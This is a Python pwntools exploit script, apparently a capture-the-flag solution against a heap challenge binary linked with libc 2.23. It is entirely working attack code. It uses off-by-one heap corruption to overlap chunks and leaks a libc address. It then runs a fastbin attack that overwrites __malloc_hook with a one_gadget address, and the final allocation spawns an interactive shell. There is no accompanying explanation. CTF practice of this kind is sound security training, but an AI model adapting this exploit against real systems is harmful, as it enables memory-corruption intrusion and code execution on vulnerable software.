#!/usr/bin/env python2
from pwn import *
from time import sleep

exe = ELF("./chall")
libc = ELF("./libc-2.23.so")
context.binary = exe
context.terminal = "wt.exe -- wsl.exe -d Ubuntu-20.04 -- ".split()
#context.terminal = "kitty -e sh -c".split()
context.log_level = "debug"
#context.aslr = False

global io
breakpoints = '''
break *main+67
continue
'''+'continue\n'*55

if len(sys.argv) > 1 and sys.argv[1] == "-ng":
    io = process(exe.path)
else:
    io = gdb.debug(exe.path, gdbscript=breakpoints)
    
re = lambda a: io.recv(a)
reu = lambda a: io.recvuntil(a)
rl = lambda: io.recvline()
s = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla = lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

def alloc(size,content):
    sla("> ", "1")
    sla("Size: ", str(size))
    if content == "shell":
        return
    sla("Content: ", content)
    reu("Index ")
    return int(re(1))

def free(index):
    sla("> ", "2")
    sla("Index: ", str(index))

def show(index):
    sla("> ", "3")
    sla("Index: ", str(index))
    reu("Content:\n")

one_gadget = 0xf03a4

a = alloc(0xf8,"AAAA")
b = alloc(0x68,"BBBB")
c = alloc(0xf8,"CCCC")
d = alloc(0x18,"DDDD")

free(b)
free(a)
b = alloc(0x68,"E"*0x68)

for i in range(0x66,0x5f,-1):
    free(b)
    b = alloc(i+2,"X"*i+"\x70\x01")

free(c)
e = alloc(0xf6,"E"*0xf6)
show(b)

libc.address = unpack(re(6),48) - 0x3c4b78
log.info("Libc -> "+hex(libc.address))
fake_chunk = libc.symbols["__malloc_hook"]-0x23

for i in range(0xfd,0xf7,-1):
    free(e)
    e = alloc(i+1,"X"*i+"\x70")

free(b)
free(e)

e = alloc(0x108,"A"*0x100+p64(fake_chunk))

for i in range(0xfe,0xf7,-1):
    free(e)
    e = alloc(i+1,"X"*i+"\x70")

alloc(0x68,"BBBB")
alloc(0xf8,"\x00"*0xf7)
alloc(0x68,"A"*0x13+p64(libc.address+one_gadget))

log.info(hex(libc.address+one_gadget))
alloc(137,"shell")

io.interactive()